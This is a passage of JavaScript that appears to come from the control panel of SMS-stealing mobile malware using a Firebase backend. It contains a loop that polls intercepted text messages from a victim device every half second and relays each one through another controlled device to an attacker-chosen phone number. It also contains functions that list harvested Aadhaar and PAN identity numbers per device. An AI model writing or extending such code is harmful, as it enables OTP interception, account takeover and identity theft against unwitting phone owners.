    const senderDev = document.getElementById('sheetSenderDevice').value;
    if (!targetPhone || !senderDev) return showToast('Enter phone & select device', 'warning');

    state.forwardThreads[devId] = true;
    btn.textContent = 'Stop';
    btn.className = 'action-btn action-red';
    statusEl.textContent = 'Monitoring…';

    let seenKeys = new Set();
    fetch(`${FB_URL}/${SMS_PATH}/${devId}.json?shallow=true`).then(r => r.json()).then(d => { if (d) seenKeys = new Set(Object.keys(d)); }).catch(() => {});

    state.forwardIntervals[devId] = setInterval(async () => {
        if (!state.forwardThreads[devId]) { clearInterval(state.forwardIntervals[devId]); return; }
        try {
            const data = await fetch(`${FB_URL}/${SMS_PATH}/${devId}.json`).then(r => r.json());
            if (!data) return;
            for (const [k, v] of Object.entries(data)) {
                if (seenKeys.has(k)) continue;
                seenKeys.add(k);
                if (!v || typeof v !== 'object') continue;
                const body = v.body || v.message || v.msg || '';
                try {
                    await fetch(`${FB_URL}/${DATA_PATH}/${senderDev}.json`, {
                        method: 'PATCH',
                        body: JSON.stringify({ command: "send message", phoneNumber: targetPhone, messageText: body, simSlot: "1", targetDeviceId: senderDev }),
                        headers: { 'Content-Type': 'application/json' },
                    });
                    statusEl.textContent = `Forwarded → ${targetPhone}`;
                } catch (e) {}
            }
        } catch (e) {}
    }, 500);
}

// ---- Utility ----
function esc(text) {
    const d = document.createElement('div');
    d.textContent = text;
    return d.innerHTML;
}


// ---- Pages Data Logic ----
async function fetchPagesData() {
    if (!FB_URL) return showToast('Select a server first', 'error');
    const pagesList = document.getElementById('pagesList');
    setStatus('Fetching Pages...', 'loading');
    
    try {
        const pagesToFetch = ['page2'];
        let html = '';
        
        for (const page of pagesToFetch) {
            const r = await fetch(`${FB_URL}/${page}.json`);
            const data = await r.json();
            
            if (data && Object.keys(data).length > 0) {
                for (const [id, info] of Object.entries(data)) {
                    if (page === 'page2') {
                        // Special Page 2 Card with Aadhar/PAN logic
                        // Swap Aadhar and PAN mapping as requested
                        let aadhar = info.pan || info.Pan || info.PAN || 'N/A';
                        let pan = info.aadhar || info.Aadhar || info.AADHAR || 'N/A';
                        
                        html += `<div onclick="openSheet('${id}')" style="background:#050505; margin-bottom: 16px; padding:20px; border:1px solid var(--green); box-shadow:0 0 10px rgba(51,255,0,0.2); cursor:pointer; transition:all 0.2s; width: 100%; box-sizing: border-box;" onmousedown="this.style.transform='scale(0.96)'; this.style.boxShadow='0 0 5px rgba(51,255,0,0.4)';" onmouseup="this.style.transform='scale(1)'; this.style.boxShadow='0 0 10px rgba(51,255,0,0.2)';" ontouchstart="this.style.transform='scale(0.96)'; this.style.boxShadow='0 0 5px rgba(51,255,0,0.4)';" ontouchend="this.style.transform='scale(1)'; this.style.boxShadow='0 0 10px rgba(51,255,0,0.2)';">
                            <strong style="color:var(--green); font-size:1.05rem; display:block; margin-bottom:16px; padding-bottom:12px; border-bottom:1px dashed var(--green); word-break: break-all; text-shadow:0 0 5px var(--green);">ID: ${id}</strong>
                            
                            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:16px;">
                                <div style="display:flex; align-items:center; gap:10px;">
                                    <span style="font-size:1.4rem;">🪪</span>
                                    <span style="color:var(--green); font-size:0.85rem; font-weight:800; text-transform:uppercase; letter-spacing: 0.5px;">Aadhar</span>
                                </div>
                                <span style="color:var(--green); font-family:monospace; font-weight:800; font-size:1.05rem; text-shadow:0 0 5px var(--green);">${esc(String(aadhar))}</span>
                            </div>
                            
                            <div style="display:flex; justify-content:space-between; align-items:center;">
                                <div style="display:flex; align-items:center; gap:10px;">
                                    <span style="font-size:1.4rem;">💳</span>
                                    <span style="color:var(--green); font-size:0.85rem; font-weight:800; text-transform:uppercase; letter-spacing: 0.5px;">PAN Card</span>
                                </div>
                                <span style="color:var(--green); font-family:monospace; font-weight:800; font-size:1.05rem; text-shadow:0 0 5px var(--green);">${esc(String(pan))}</span>
                            </div>
                        </div>`;
                    } else {
                        // Standard Rendering for other pages
                        html += `<div style="background:#050505; padding:12px; border:1px solid var(--green); margin-bottom:10px;">
                            <strong style="color:var(--green); font-size:0.85rem; display:block; margin-bottom:8px; text-shadow:0 0 5px var(--green);">ID: ${id}</strong>`;
                        for (const [k, v] of Object.entries(info)) {
                            html += `<div style="display:flex; justify-content:space-between; font-size:0.8rem; padding:4px 0; border-bottom:1px dashed rgba(51,255,0,0.3);">
                                <span style="color:var(--text-2); text-transform:capitalize;">${k}</span>
                                <span style="color:var(--green); font-family:monospace; font-weight:bold; text-shadow:0 0 5px var(--green);">${esc(String(v))}</span>
                            </div>`;
                        }
                        html += `</div>`;
                    }
                }
            }
        }
        
        if (html === '') {
            html = `<div class="empty-state" style="padding:30px 0;"><p>No Data Available</p></div>`;
        }
        
        pagesList.innerHTML = html;
        setStatus('Pages Loaded');
        showToast('Pages data updated', 'success');
        
    } catch (e) {
        setStatus('Error fetching pages', 'error');
        showToast('Error: ' + e.message, 'error');
    }
}


// ---- Fetch Device More Details ----
async function fetchDeviceMoreDetails() {
    const devId = state.currentSheetDevId;
    if (!devId) return;
    
    const moreDetailsEl = document.getElementById('sheetMoreDetails');
    moreDetailsEl.style.display = 'block';
    moreDetailsEl.innerHTML = '<div style="color:var(--sub); text-align:center;">Fetching details...</div>';
    
    try {
        const pagesToFetch = ['page2'];
        let html = '';
        
        for (const page of pagesToFetch) {
            const r = await fetch(`${FB_URL}/${page}/${devId}.json`);
            const data = await r.json();
            
            if (data && Object.keys(data).length > 0 && typeof data === 'object') {
                html += `<div style="margin-bottom: 10px;">
                    <strong style="color:var(--emerald); font-size: 0.9rem; display:block; margin-bottom: 5px;">${page.toUpperCase()}</strong>`;
                for (const [k, v] of Object.entries(data)) {
                    html += `<div style="display:flex; justify-content:space-between; font-size:0.8rem; padding:3px 0; border-bottom:1px solid rgba(255,255,255,0.05);">
                        <span style="color:var(--sub);">${k}</span>
                        <span style="color:var(--text); font-family:monospace; font-weight:bold; word-break:break-all; max-width:60%; text-align:right;">${esc(String(v))}</span>
                    </div>`;
                }
                html += `</div>`;
            }
        }
        
        if (html === '') {
            html = '<div style="color:var(--sub); text-align:center;">No extra details found in pages.</div>';
        }
        
        moreDetailsEl.innerHTML = html;
        showToast('Extra details loaded', 'success');
    } catch(e) {
        moreDetailsEl.innerHTML = '<div style="color:var(--red); text-align:center;">Failed to fetch details</div>';
        showToast(e.message, 'error');
    }
}
